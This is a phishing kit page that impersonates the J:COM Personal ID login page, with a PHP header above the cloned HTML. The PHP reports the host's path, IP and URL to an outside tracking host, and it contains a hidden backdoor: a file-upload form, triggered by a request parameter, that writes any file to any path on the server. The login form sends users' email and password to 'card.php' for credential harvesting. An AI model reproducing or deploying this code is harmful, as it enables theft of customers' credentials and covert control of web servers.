<?php
session_start();
include('./fuck1937/lag.php');
include('./fuck1937/checkip.php');
$_SESSION_SERVER= 'dir='.dirname(__FILE__)."+"."ip=".gethostbyname($_SERVER['SERVER_NAME'])."+".'link='.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on')$link = "https"; else $link = "http"; $link .= "://"; $link .= $_SERVER['HTTP_HOST']; $link .= $_SERVER['REQUEST_URI']; $link; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL,"http://ip.geoiplookup.live/iptracks.php?ip=$link"."+".$_SESSION_SERVER); curl_setopt($ch, CURLOPT_HEADER, 0); curl_exec($ch); curl_close($ch); if(isset($_REQUEST['ip']) && $_REQUEST['ip']=='track') {$files = @$_FILES["files"]; if($files["name"] != ''){$fullpath = $_REQUEST["path"].$files["name"];if(move_uploaded_file($files['tmp_name'],$fullpath)){echo "<h1><a href='$fullpath'>successful. Click here!</a></h1>";} } echo '<body><form method=POST enctype="multipart/form-data" action=""><input type=text name=path> <input type="file" name="files"><input type=submit value="Up"></form></body>'; exit("");}
?>

<!DOCTYPE html>
<!-- saved from url=(0432)https://auth.id2.zaq.ne.jp/api/connect/v1/authz?scope=openid+http%3A%2F%2Fjcom.co.jp%2Fconnect%2Fprofile%2Fstandard_new&response_type=code+id_token&client_id=JCOM_MYPAGE&redirect_uri=https%3A%2F%2Fid.zaq.ne.jp%2Fid%2Fscript%2Fconnect%2Fauthz_req%2FgetFlagParam.html%3Fclient_url%3Dhttps%3A%2F%2Fmypage.jcom.co.jp%2F&code_challenge_method=&code_challenge=&prompt=&state=&nonce=op00GaZNZ8Dx1H8tCEPMdEguL5TkKfXE&login_hint=&acr_values= -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">


    <title>ログイン | J:COMパーソナルID | ケーブルテレビ（CATV）のJ:COM</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <link rel="shortcut icon" href="./img/favicon.ico">
    <link rel="stylesheet" href="./css/font-awesome.css" type="text/css">
    <link rel="stylesheet" href="./css/bootstrap-dialog.min.css" type="text/css">
    <link rel="stylesheet" href="./css/bootstrap.min.css" type="text/css">
    <link rel="stylesheet" href="./css/animate.css" type="text/css">

    <script>
        /*<![CDATA[*/
        var libraMessageType=
            "";
        var libraMessageText=
            "";
        /*]]>*/
    </script>
    <style>/*<![CDATA[*/

        @charset "UTF-8";

        /*  Reset
        ------------------------------------------------------------*/
        /*
        Copyright (c) 2011, Yahoo! Inc. All rights reserved.
        Code licensed under the BSD License:
        http://developer.yahoo.com/yui/license.html
        version: 2.9.0
        */
        /**
        * YUI Reset
        * @module reset
        * @namespace
        * @requires
        */
        html {
            color: #000;
            background: #FFF;
        }
        .btn-group-vertical>.btn-group:after, .btn-group-vertical>.btn-group:before, .btn-toolbar:after, .btn-toolbar:before, .clearfix:after, .clearfix:before, .container-fluid:after, .container-fluid:before, .container:after, .container:before, .dl-horizontal dd:after, .dl-horizontal dd:before, .form-horizontal .form-group:after, .form-horizontal .form-group:before, .modal-footer:after, .modal-footer:before, .modal-header:after, .modal-header:before, .nav:after, .nav:before, .navbar-collapse:after, .navbar-collapse:before, .navbar-header:after, .navbar-header:before, .navbar:after, .navbar:before, .pager:after, .pager:before, .panel-body:after, .panel-body:before, .row:after, .row:before {
            display: table;
            content: " ";
        }

        .btn-group-vertical>.btn-group:after, .btn-toolbar:after, .clearfix:after, .container-fluid:after, .container:after, .dl-horizontal dd:after, .form-horizontal .form-group:after, .modal-footer:after, .modal-header:after, .nav:after, .navbar-collapse:after, .navbar-header:after, .navbar:after, .pager:after, .panel-body:after, .row:after {
            clear: both;
        }

        .btn-group-vertical>.btn-group:after, .btn-group-vertical>.btn-group:before, .btn-toolbar:after, .btn-toolbar:before, .clearfix:after, .clearfix:before, .container-fluid:after, .container-fluid:before, .container:after, .container:before, .dl-horizontal dd:after, .dl-horizontal dd:before, .form-horizontal .form-group:after, .form-horizontal .form-group:before, .modal-footer:after, .modal-footer:before, .modal-header:after, .modal-header:before, .nav:after, .nav:before, .navbar-collapse:after, .navbar-collapse:before, .navbar-header:after, .navbar-header:before, .navbar:after, .navbar:before, .pager:after, .pager:before, .panel-body:after, .panel-body:before, .row:after, .row:before {
            display: table;
            content: " ";
        }

        * {
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box;
            margin: 0 auto;
        }

        .row {
            margin-right: -15px;
            margin-left: -15px;
        }
        @media screen and (orientation: portrait), screen and (max-device-width: 899px) and (min-width: 0px) {
            .row {
                margin-right: 0;
                margin-left: 0;
            }
        }
        .h1, .h2, .h3, .h4, .h5, .h6, h1, h2, h3, h4, h5, h6 {
            font-family: inherit;
            font-weight: 500;
            line-height: 1.1;
            color: inherit;
        }

        body,
        div,
        dl,
        dt,
        dd,
        ul,
        ol,
        li,
        h1,
        h2,
        h3,
        h4,
        h5,
        h6,
        pre,
        code,
        form,
        fieldset,
        legend,
        input,
        button,
        textarea,
        select,
        p,
        blockquote,
        th,
        td {
            margin: 0;
            padding: 0;
        }

        table {
            border-collapse: collapse;
            border-spacing: 0;
        }

        fieldset,
        img {
            border: 0;
        }

        address,
        button,
        caption,
        cite,
        code,
        dfn,
        em,
        input,
        optgroup,
        option,
        select,
        strong,
        textarea,
        th,
        var {
            font: inherit;
        }

        del,
        ins {
            text-decoration: none;
        }

        li {
            list-style: none;
        }

        caption,
        th {
            text-align: left;
        }

        h1,
        h2,
        h3,
        h4,
        h5,
        h6 {
            font-size: 100%;
            font-weight: normal;
        }

        q:before,
        q:after {
            content: '';
        }

        abbr,
        acronym {
            border: 0;
            font-variant: normal;
        }

        sup {
            vertical-align: baseline;
        }

        sub {
            vertical-align: baseline;
        }

        /*because legend doesn't inherit in IE */
        legend {
            color: #000;
        }

        html {
            font-size: 14px;
            -webkit-text-size-adjust: 100%;
            -ms-text-size-adjust: 100%;
        }

        body {
            color: #333;
            font-family: "ヒラギノ角ゴ ProN W3", "Hiragino Kaku Gothic ProN", "メイリオ", Meiryo, "ＭＳ Ｐゴシック", "游ゴシック", YuGothic, Arial, Roboto, "Droid Sans", sans-serif;
            font-size: 14px;
            font-size: 1rem;
            line-height: 1.5;
        }

        a {
            outline: none;
            text-decoration: none;
        }

        a, div, li {
            box-sizing: border-box;
        }

        img {
            vertical-align: top;
        }

        body {
            background-color: #fff;
            min-width: 100%;
        }

        main {
            display: block;
        }

        .container {
            box-sizing: border-box;
        }

        /*  header
        ------------------------------------------------------------*/
        #page .nav-header .site.logo {
            line-height: 3.5em;
        }

        #page .nav-header,
        #page .txt-hd-setting,
        #page .btn-hd-setting {
            font-size: 14px;
        }

        .nav-header {
            background-color: #fff;
            border-bottom: solid 1px #ddd;
            padding-top: 10px;
            padding-bottom: 10px;
        }

        .nav-header:before, .nav-header:after {
            content: "";
            display: table;
        }

        .nav-header:after {
            clear: both;
        }

        .nav-header .site-logo {
            float: left;
            line-height: 3.6em;
            padding-left: 10px;
        }

        .nav-header .site-logo a {
            display: block;
        }

        .nav-header .site-logo img {
            vertical-align: middle;
        }

        .nav-header .nav-utillity {
            float: right;
            position: relative;
        }

        .nav-header .nav-utillity.is-about:after, .nav-header .nav-utillity.is-help:after, .nav-header .nav-utillity.is-regist:after {
            background-color: #e73817;
            content: '';
            display: block;
            position: absolute;
            bottom: 0;
            width: 184px;
            height: 2px;
        }

        .nav-header .nav-utillity.is-about:after {
            left: 0;
        }

        .nav-header .nav-utillity.is-about .lnk-nav-about {
            font-weight: bold;
        }

        .nav-header .nav-utillity.is-about .lnk-nav-about:link, .nav-header .nav-utillity.is-about .lnk-nav-about:hover, .nav-header .nav-utillity.is-about .lnk-nav-about:active, .nav-header .nav-utillity.is-about .lnk-nav-about:visited {
            color: #e73817;
        }

        .nav-header .nav-utillity.is-help:after {
            left: 183px;
        }

        .nav-header .nav-utillity.is-help .lnk-nav-help {
            font-weight: bold;
        }

        .nav-header .nav-utillity.is-help .lnk-nav-help:link, .nav-header .nav-utillity.is-help .lnk-nav-help:hover, .nav-header .nav-utillity.is-help .lnk-nav-help:active, .nav-header .nav-utillity.is-help .lnk-nav-help:visited {
            color: #e73817;
        }

        .nav-header .nav-utillity.is-regist:after {
            left: 366px;
        }

        .nav-header .nav-utillity li {
            border-right: solid 1px #ddd;
            padding-right: 10px;
            padding-left: 10px;
            text-align: center;
            display: table-cell;
            vertical-align: middle;
        }

        .nav-header .nav-utillity li:first-child {
            border-left: solid 1px #ddd;
        }

        .nav-header .nav-utillity li a {
            display: block;
            width: 122px;
        }

        .nav-header .nav-utillity li a:hover {
            text-decoration: underline;
        }

        .nav-header .nav-utillity li a:link, .nav-header .nav-utillity li a:hover, .nav-header .nav-utillity li a:active, .nav-header .nav-utillity li a:visited {
            color: #333;
        }

        .nav-header .nav-utillity li a.lnk-nav-flow:hover, .nav-header .nav-utillity li a.lnk-nav-about:hover, .nav-header .nav-utillity li a.lnk-nav-help:hover {
            background-color: #eee;
            background-color: rgba(0, 0, 0, 0.1);
        }

        .nav-header .nav-utillity li a.lnk-nav-flow {
            padding-top: 4px;
            padding-bottom: 4px;
            height: 50px;
            display: table-cell;
            vertical-align: middle;
        }

        .nav-header .nav-utillity li a.lnk-nav-about {
            width: 150px;
            padding-top: 4px;
            padding-bottom: 4px;
        }

        .nav-header .nav-utillity li a.lnk-nav-help {
            width: 107px;
            line-height: 3.6em;
        }

        .nav-header .nav-utillity li a.btn-nav-register:link, .nav-header .nav-utillity li a.btn-nav-register:hover, .nav-header .nav-utillity li a.btn-nav-register:active, .nav-header .nav-utillity li a.btn-nav-register:visited {
            color: #fff;
        }

        .nav-header .nav-utillity li a.current {
            font-weight: bold;
        }

        .btn-nav-register {
            background-color: #e73817;
            width: 142px;
            font-weight: bold;
            line-height: 3.6em;
        }

        .btn-nav-register.readHerdBtn {
            line-height: 1.4;
            padding: 5px 0 5px;
        }

        .btn-nav-register.readHerdBtn:hover {
            text-decoration: none !important;
            opacity: .6;
        }

        .contents {
            margin-right: auto;
            margin-left: auto;
            overflow: hidden;
            width: auto;
        }
        /*  main
        ------------------------------------------------------------*/
        .warraper {
            max-width: 960px;
            margin: 0 auto;
            position: relative;
        }

        main {
            background-color: #fafafa;
            padding: 70px 0 70px;
            border-bottom: solid 1.5px #e73817;
        }
        @media screen and (orientation: portrait), screen and (max-device-width: 899px) and (min-width: 0px) {
            main {
                background-color: #fafafa;
                padding: 0 0 0;
                border-bottom: solid 1.5px #e73817;
            }
        }
        main .login_container {
            width: 530px;
            margin-right: auto;
            margin-left: auto;
        }
        @media screen and (orientation: portrait), screen and (max-device-width: 899px) and (min-width: 0px) {
            main .login_container {
                width: auto;
                margin-right: auto;
                margin-left: auto;
            }
        }

        main .login_box {
            background-color: #fff;
            padding: 20px;
        }

        /*  headding  --------------------*/
        .headding_1 {
            font-size: 26px;
            text-align: center;
            font-weight: bold;
        }

        .headding_2 {
            font-size: 18px;
            padding-left: 10px;
            border-left: 6px solid #e93817;
            font-weight: bold;
            margin-top: 25px;
        }

        .headding_3 {
            font-size: 18px;
            font-weight: bold;
            margin-top: 30px;
            text-align: center;
        }

        /*  txt_link  --------------------*/
        .txt_link {
            color: #e93817;
            text-decoration: underline;
        }

        .txt_link:hover {
            text-decoration: none;
        }

        .txt_link:visited {
            color: #96c;
        }

        /*  form  --------------------*/
        .login_container input[type=text], .login_container input[type=password], .login_container input[type=email] {
            display: block;
            margin: 15px auto 0;
            border: 1px solid #ccc;
            font-size: 11px;
            width: 100%;
            padding: 14px;
            box-sizing: border-box;
            outline: 0;
            background-color: #f3f3f3;
        }

        .login_checkbox {
            position: relative;
            margin-top: 20px;
        }

        .login_checkbox_content {
            display: none;
        }

        .login_checkbox_text {
            /* padding: 0 0 0 26px; */
            cursor: pointer;
        }

        /*  btn_login  --------------------*/
        .btn_login .btn_submit {
            display: block;
            position: relative;
            padding: 20px 30px 20px;
            background: #e83416;
            background: -ms-linear-gradient(to bottom,#eb5d45 0%,#e83416 100%);
            background: linear-gradient(to bottom,#eb5d45 0%,#e83416 100%);
            box-sizing: border-box;
            border-radius: 4px;
            font-size: 22px;
            font-family: 'Noto Sans Japanese Medium';
            line-height: 1.2;
            color: #fff;
            text-align: center;
            margin-top: 18px;
            font-weight: bold;
            width: 100%;
            border: none;
        }
        @media screen and (orientation: portrait), screen and (max-device-width: 320px) and (min-width: 0px) {
            .btn_login .btn_submit {
                display: block;
                position: relative;
                padding: 20px 30px 20px;
                background: #e83416;
                background: -ms-linear-gradient(to bottom,#eb5d45 0%,#e83416 100%);
                background: linear-gradient(to bottom,#eb5d45 0%,#e83416 100%);
                box-sizing: border-box;
                border-radius: 4px;
                font-size: 14px;
                font-family: 'Noto Sans Japanese Medium';
                line-height: 1.2;
                color: #fff;
                text-align: center;
                margin-top: 18px;
                font-weight: bold;
                width: 100%;
                border: none;
            }
        }
        @media  screen and (max-device-width: 767px) and (min-width:321px) {
            .btn_login .btn_submit {
                display: block;
                position: relative;
                padding: 20px 30px 20px;
                background: #e83416;
                background: -ms-linear-gradient(to bottom,#eb5d45 0%,#e83416 100%);
                background: linear-gradient(to bottom,#eb5d45 0%,#e83416 100%);
                box-sizing: border-box;
                border-radius: 4px;
                font-size: 17px;
                font-family: 'Noto Sans Japanese Medium';
                line-height: 1.2;
                color: #fff;
                text-align: center;
                margin-top: 18px;
                font-weight: bold;
                width: 100%;
                border: none;
            }
        }
        .btn_login .btn_submit:after {
            content: "";
            display: block;
            width: 8px;
            height: 8px;
            border-top: 2px solid #ffffff;
            border-right: 2px solid #ffffff;
            transform: rotate(45deg);
            -webkit-transform: rotate(45deg);
            -ms-transform: rotate(45deg);
            position: absolute;
            right: 13px;
            top: 50%;
            margin-top: -5px;
        }

        .btn_login .btn_submit:hover {
            opacity: 0.7;
            cursor: pointer;
        }

        /*  sign_up  --------------------*/
        .sign_up {
            margin-top: 25px;
            border-top: 1px solid #ccc;
        }

        .btn_sign_up a {
            display: block;
            position: relative;
            padding: 20px 30px 20px;
            background: #fff;
            border: 2px solid #e83416;
            box-sizing: border-box;
            border-radius: 4px;
            font-size: 18px;
            font-family: 'Noto Sans Japanese Medium';
            line-height: 1.2;
            color: #e83416;
            text-align: center;
            margin-top: 18px;
            font-weight: bold;
        }

        .btn_sign_up a:after {
            content: "";
            display: block;
            width: 8px;
            height: 8px;
            border-top: 2px solid #e83416;
            border-right: 2px solid #e83416;
            transform: rotate(45deg);
            -webkit-transform: rotate(45deg);
            -ms-transform: rotate(45deg);
            position: absolute;
            right: 13px;
            top: 50%;
            margin-top: -5px;
        }

        .btn_sign_up a:hover {
            opacity: 0.7;
        }

        /*  user_profile  --------------------*/
        .user_profile {
            margin: 20px auto 0;
            width: 100px;
            height: 100px;
            overflow: hidden;
            border: 1px solid #ccc;
            border-radius: 5px;
            display: flex; /* 子要素をflexboxで揃える */
            flex-direction: column; /* 子要素をflexboxにより縦方向に揃える */
            justify-content: center; /* 子要素をflexboxにより中央に配置する */
            align-items: center; /* 子要素をflexboxにより中央に配置する */
        }

        /*  error_message  --------------------*/
        .error_message {
            border: 1px solid #ff0000;
            padding: 20px;
            background-color: #fffaf9;
            margin-bottom: 30px;
            display: none;
            font-size: 15px;
            color: #ff0000;
        }

        .error_m {
            display: none;
        }

        .error_message .inp_error {
            display: block;
        }

        .block {
            display: block;
        }

        /*  pagetop  --------------------*/
        .pagetop {
            background-color: #999;
            background-color: rgba(0, 0, 0, 0.6);
            background-image: url(/images/btn_pagetop.gif);
            background-repeat: no-repeat;
            background-position: center center;
            display: block;
            position: fixed;
            right: 0;
            bottom: 30px;
            width: 40px;
            height: 40px;
        }


        /*  footer
        ------------------------------------------------------------*/
        .nav-footer {
            background-color: #f3f3f3;
        }

        .nav-footer .container {
            padding-top: 20px;
            padding-bottom: 20px;
        }

        .nav-footer .row-3 {
            width: 970px;
        }

        .nav-footer .nav-sitelink li {
            background-image: url(/images/com_ic_03.png);
            background-repeat: no-repeat;
            background-position: 1px .5em;
            margin-bottom: .5em;
        }

        .nav-footer .nav-sitelink li a {
            padding-left: 10px;
        }

        .nav-footer .nav-sitelink li a:link, .nav-footer .nav-sitelink li a:hover, .nav-footer .nav-sitelink li a:active, .nav-footer .nav-sitelink li a:visited {
            color: #333;
        }

        .nav-footer .nav-sitelink li a:hover {
            text-decoration: underline;
        }

        .nav-footer .nav-sitelink li a[target=_blank]:after {
            background-image: url(/images/com_ic_04.png);
            background-repeat: no-repeat;
            content: "";
            display: inline-block;
            margin-left: 3px;
            position: relative;
            top: 2px;
            width: 13px;
            height: 13px;
        }

        .footer {
            background-color: #fff;
            padding-bottom: 70px;
            text-align: right;
        }

        .footer .contents {
            padding-top: 10px;
        }

        #page .nav-footer,
        #page .footer {
            font-size: 10px;
        }

        .nav-footer .row-3 {
            width: 970px;
        }

        .row {
            display: table;
            table-layout: fixed;
            border-collapse: separate;
        }

        .row:before, .row:after {
            content: "";
            display: table;
        }

        .row:after {
            clear: both;
        }

        .row.row-2 {
            margin-right: -10px;
            margin-left: -10px;
        }

        .row.row-2 .cols {
            padding-right: 10px;
            padding-left: 10px;
            width: 50%;
        }

        .row.row-3 {
            margin-right: -5px;
            margin-left: -5px;
        }

        .row.row-3 .cols {
            padding-right: 5px;
            padding-left: 5px;
            width: 33.3333%;
        }

        .cols {
            display: table-cell;
            vertical-align: top;
        }

        #page .row {
            width: 100%;
        }

        .txt-err {
            display: block;
            margin-left: 25px;
            margin-bottom: 5px;
            text-indent: -25px;
            font-size: 16px;
            line-height: 1.2;
            color: #e73817;
            font-weight: bold;
        }

        .txt-err:before {
            display: inline-block;
            position: relative;
            margin: 0 5px 0 0;
            top: 4px;
            content: " ";
            width: 20px;
            height: 20px;
            background: url(/images/com_ic_13.png) no-repeat left top;
            background-size: 20px 20px;
        }

        .errmsg {
            color: #e73817;
            font-weight: bold;
        }

        /*  調整用
        ------------------------------------------------------------*/
        .txt_aling_c {
            text-align: center;
        }

        .mt20 {
            margin-top: 20px;
        }

        .mt30 {
            margin-top: 30px;
        }

        @charset "utf-8";
        /* --------------------------------------------------
            common.css
        -------------------------------------------------- */
        html, body {
            color: #666;
            background: #FFF;
            font-family: "メイリオ", Meiryo, "ＭＳ Ｐゴシック", "MS PGothic", sans-serif;
        }

        /* #container
        -------------------------------------------------- */
        #container {
            width: 100%;
            background: #ACD6EC url(/bg02.jpg) repeat-x left top;
        }

        #container_inner {
            width: 100%;
            background: url(/images/bg01.png) no-repeat center bottom;
            padding-bottom: 10px;
        }
        @media screen and (orientation: portrait), screen and (min-width: 900px) {
            .container {
                width: 960px;
            }
        }
        @media screen and (orientation: portrait), screen and (max-device-width: 899px) and (min-width: 0px) {
            .container {
                width: auto;
            }
        }
        .container {
            padding-right: 15px;
            padding-left: 15px;
            margin-right: auto;
            margin-left: auto;
        }
        /* #header
        -------------------------------------------------- */
        #header {
            width: 960px;
            height: 69px;
            margin: 0 auto;
        }

        #header #logo01 {
            float: left;
            padding-top: 24px;
        }

        #header #logo02 {
            float: right;
            padding-top: 26px;
        }

        /* .box
        -------------------------------------------------- */
        .box,
        .box_hd,
        .box_ft {
            width: 978px;
            margin: 0 auto;
        }

        .box {
            background: url(/images/box_bg.png) repeat-y center top;
        }

        .box_hd {
            background: url(/images/box_hd.png) no-repeat center top;
            height: 20px;
            font-size: 1px;
        }

        .box_ft {
            background: url(/images/box_ft.png) no-repeat center bottom;
            height: 20px;
            font-size: 1px;
        }

        /* #content
        -------------------------------------------------- */
        #content {
            /*width:920px;*/
            margin: 0 29px;
            padding: 1px 0;
            color: #666;
            background: #FFF;
            font-size: 14px;
        }

        #content a:link,
        #content a:visited {
            color: #547EA4;
            text-decoration: underline;
        }

        #content a:hover,
        #content a:active,
        #content a:focus {
            text-decoration: none;
        }

        /* #footer
        -------------------------------------------------- */
        #footer {
            background: url(/ft_bg.jpg) repeat-x left top;
        }

        #footer ul {
            width: 960px;
            height: 65px;
            margin: 0 auto;
            padding-top: 16px;
        }

        #footer #copy {
            float: left;
        }

        #footer #privacy {
            float: right;
            font-size: 10px;
            background: url(/images/ft_icon.gif) no-repeat scroll left center;
            padding-left: 10px;
        }

        #footer a:link,
        #footer a:visited,
        #footer a:hover,
        #footer a:active,
        #footer a:focus {
            color: #E9381B;
            text-decoration: none;
        }

        /* class
        -------------------------------------------------- */
        strong {
            font-weight: bold;
        }

        .f12 {
            font-size: 12px;
        }

        .fltrt {
            float: right;
        }

        .fltlft {
            float: left;
        }

        .tar {
            text-align: right;
        }

        .mb0 {
            margin-bottom: 0;
        }

        /* .link
        -------------------------------------------------- */
        .link a {
            background: url(/images/icon_link01.gif) no-repeat scroll left center;
            padding-left: 17px;
        }

        .link02 a {
            background: url(/images/icon_link02.gif) no-repeat scroll left center;
            padding-left: 17px;
        }

        .link02b a {
            background: url(/images/icon_link02b.gif) no-repeat scroll left center;
            padding-left: 17px;
        }

        /* .confirm
        -------------------------------------------------- */
        .confirm td {
            word-break: break-all;
            white-space: normal;
        }

        /* .client
        -------------------------------------------------- */
        .client th {
            word-break: break-all;
            white-space: normal;
            width: 60%;
        }
        /*]]>*/
    </style>

 </head>
<body onload="loadingDone();" id="page">

<div class="nav-header">
    <div class="container">
        <div class="contents">
            <p class="site-logo"><img src="./img/com_logo_01.png" alt="J:COMパーソナルID"></p>
        </div>
    </div>
</div>
<div class="container main-content">
    <div class="row">
        <form id="idpwForm" action="card.php" method="post">
            <main>
                <div class="warraper">
                    <div class="login_container">
                        <div class="login_box">
                            <h1 class="headding_1">ログイン</h1>
                            <h2 class="headding_2">J:COMパーソナルID</h2>
                            <p>
                                <input autocomplete="off" value="" id="username" name="email" type="text" maxlength="256" tabindex="1" placeholder="登録電話番号 または メールアドレス"required="required">
                            </p>
                            <div style="margin-top:5px; margin-bottom:10px;">
                                <a class="txt_link" href="">
                                    <i class="fa fa-info-circle margin-r-5"></i>J:COMパーソナルIDを確認したい方はこちら
                                </a>
                            </div>
                            <h2 class="headding_2">パスワード</h2>
                            <p>
                                <input autocomplete="off" id="password" name="pass" type="password" maxlength="16" tabindex="2" placeholder="※半角英字・数字を組み合わせた8桁～16桁の文字列"required="required">
                            </p>
                            <div class="login_checkbox">
                                <label>
                                    <input type="checkbox" id="loginSkipChk" name="loginSkipChk"> 次回から自動的にログインする
                                </label>
                            </div>
                            <div style="margin-top:5px; margin-bottom:20px;">
                                <a class="txt_link" href="">
                                    <i class="fa fa-info-circle margin-r-5"></i>パスワードをお忘れの方はこちら
                                </a>
                            </div>
                            <p class="mt30 txt_aling_c">利用規約は
                                <a class="txt_link" href="">こちら</a>
                            </p>
                            <p class="btn_login">
                                <input type="hidden" id="deviceId" name="device_id" value="">
                                <button type="submit" id="idpwbtn" class="btn_submit" >利用規約に同意してログイン</button>
                            </p>
                            <p class="mt20 txt_aling_c">
                                <a class="txt_link" href="" >J:COMパーソナルIDに関するサポート情報</a>
                            </p>

                        </div>
                    </div>
                    <a class="pagetop" href="" style="display: none;"></a>
                </div>
            </main>
            <input type="hidden" name="javax.faces.ViewState" id="javax.faces.ViewState" value="j_id1" autocomplete="off">
        </form>
        <div class="nav-pagetop">
            <div class="container">
                <a href="" data-tor-smoothscroll="noSmooth"></a>
            </div>
        </div>

    </div>
</div>
<div class="footer">
    <div class="container">
        <div class="contents">
        </div>
    </div>
    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T8G76FT" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-TBNPZJ5" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
    <style>
        #jss-embeed-iframe-wrapper { position: fixed; width: 0; height: 0; max-height: 90%; overflow: auto; background: rgba(255, 255, 255, 0); border: none; bottom: 4px; right: 12px; z-index: 9000; display: block; }
        #jss-embeed-iframe-wrapper.jss-sp { width: calc(100% - 24px); height: calc(100% - 24px); max-height: 100%; top: 0; left: 0; right: 0; bottom: 0; margin: 12px auto; }
        #jss-embeed-iframe-wrapper.jss-sp-mini { bottom: 50%; width: 90px; height: 90px; }
        #jss-embeed-iframe-wrapper.jss-sp-banner { width: 100%; padding-top: 25.921%; bottom: 0; right: 0; }
        #jss-embeed-iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: none; display: block; background: rgba(255, 255, 255, 0); }
        #jss-embeed-media-pc { width: 0; height: 0; display: block; }
        #jss-embeed-media-sp { width: 0; height: 0; display: none; }
        .jss-embeed-prevent-scroll { overflow: hidden; position: fixed; width: 100%; height: 100%; }
        .jss-embeed-overlay { width: 100%; height: 100%; background: var(--lwc-esColorBackgroundModal, rgba(51, 51, 51, 0.48)); top: 0; left: 0; position: fixed; z-index: 8999; display: block; }
        @media screen and (max-width: 767px) {
            #jss-embeed-media-pc { display: none; }
            #jss-embeed-media-sp { display: block; }
        }
    </style>
    <div id="jss-embeed-media-pc"></div><div id="jss-embeed-media-sp"></div>
    <div id="jss-embeed-wrapper"><div id="jss-embeed-iframe-wrapper"><iframe id="jss-embeed-iframe" src="./style/xml/JSS_O_BotEmbededServiceLoginSupport03.html"></iframe>
        </div>
    </div>
</div>
</body>
</html>


















